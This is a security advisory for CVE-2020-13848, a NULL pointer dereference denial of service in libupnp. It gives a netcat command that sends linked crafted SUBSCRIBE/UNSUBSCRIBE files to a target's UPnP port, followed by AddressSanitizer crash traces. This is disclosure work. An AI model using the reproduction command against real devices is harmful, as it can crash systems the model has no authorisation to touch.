# CVE-2020-13848: Denial of Service in Portable UPnP SDK (aka libupnp)

Portable UPnP SDK (aka libupnp) 1.12.1 and earlier allows remote attackers to cause a denial of service (crash) via a crafted SSDP message due to a NULL pointer dereference in the functions `FindServiceControlURLPath` and `FindServiceEventURLPath` in `genlib/service_table/service_table.c` [1].

## Details
There is a NULL pointer dereference in the function `FindServiceControlURLPath` in `genlib/service_table/service_table.c`.

A segmentation fault occurs if the string `controlURLPath` is NULL. This crash can be triggered by sending a malformed `SUBSCRIBE` or `UNSUBSCRIBE` using any of the attached files.

```
cat <subscribe/unsubscribe>.txt | nc <ip> 49152
```

Compiling the library with ASan enabled, this will result in the following output using subscribe.txt

```
>> AddressSanitizer:DEADLYSIGNAL
=================================================================
==1382600==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f9314e77878 bp 0x000000000002 sp 0x7f930eef98d0 T6)
==1382600==The signal is caused by a READ memory access.                                                                                                                      
==1382600==Hint: address points to the zero page.
    #0 0x7f9314e77877 in FindServiceControlURLPath src/genlib/service_table/service_table.c:357
    #1 0x7f9314e85b83 in GetDeviceHandleInfoForPath src/api/upnpapi.c:4246
    #2 0x7f9314e7fda8 in gena_process_subscription_renewal_request src/gena/gena_device.c:1464
    #3 0x7f9314e7641b in dispatch_request src/genlib/miniserver/miniserver.c:157
    #4 0x7f9314e7641b in handle_request src/genlib/miniserver/miniserver.c:230
    #5 0x7f9314e6ffca in WorkerThread src/threadutil/ThreadPool.c:576
    #6 0x7f9314e3efb6 in start_thread /build/glibc-suXNNi/glibc-2.29/nptl/pthread_create.c:486
    #7 0x7f9314d702ce in __clone (/lib/x86_64-linux-gnu/libc.so.6+0xfa2ce)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV src/genlib/service_table/service_table.c:357 in FindServiceControlURLPath
Thread T6 created by T0 here:
    #0 0x7f9314ed09b2 in pthread_create (/lib/x86_64-linux-gnu/libasan.so.5+0x399b2)
    #1 0x7f9314e6f97b in CreateWorker src/threadutil/ThreadPool.c:651

==1382600==ABORTING
```

and using unsubscribe.txt

```
>> AddressSanitizer:DEADLYSIGNAL
=================================================================
==1382441==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f0c2ac29878 bp 0x000000000002 sp 0x7f0c23cf78e0 T8)
==1382441==The signal is caused by a READ memory access.                                                                                                                      
==1382441==Hint: address points to the zero page.
    #0 0x7f0c2ac29877 in FindServiceControlURLPath src/genlib/service_table/service_table.c:357
    #1 0x7f0c2ac37b83 in GetDeviceHandleInfoForPath src/api/upnpapi.c:4246
    #2 0x7f0c2ac32001 in gena_process_unsubscribe_request src/gena/gena_device.c:1577
    #3 0x7f0c2ac2841b in dispatch_request src/genlib/miniserver/miniserver.c:157
    #4 0x7f0c2ac2841b in handle_request src/genlib/miniserver/miniserver.c:230
    #5 0x7f0c2ac21fca in WorkerThread src/threadutil/ThreadPool.c:576
    #6 0x7f0c2abf0fb6 in start_thread /build/glibc-suXNNi/glibc-2.29/nptl/pthread_create.c:486
    #7 0x7f0c2ab222ce in __clone (/lib/x86_64-linux-gnu/libc.so.6+0xfa2ce)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV src/genlib/service_table/service_table.c:357 in FindServiceControlURLPath
Thread T8 created by T0 here:
    #0 0x7f0c2ac829b2 in pthread_create (/lib/x86_64-linux-gnu/libasan.so.5+0x399b2)
    #1 0x7f0c2ac2197b in CreateWorker src/threadutil/ThreadPool.c:651

==1382441==ABORTING
```

This was tested on the current master branch and on release 1.6.6. Earlier versions may also be affected.




## References
[1] CVE-2020-13848 - https://nvd.nist.gov/vuln/detail/CVE-2020-13848

[2] [subscribe.txt](https://github.com/pjlantz/pjlantz.github.io/blob/master/docs/assets/subscribe.txt)

[3] [unsubscribe.txt](https://github.com/pjlantz/pjlantz.github.io/blob/master/docs/assets/unsubscribe.txt)
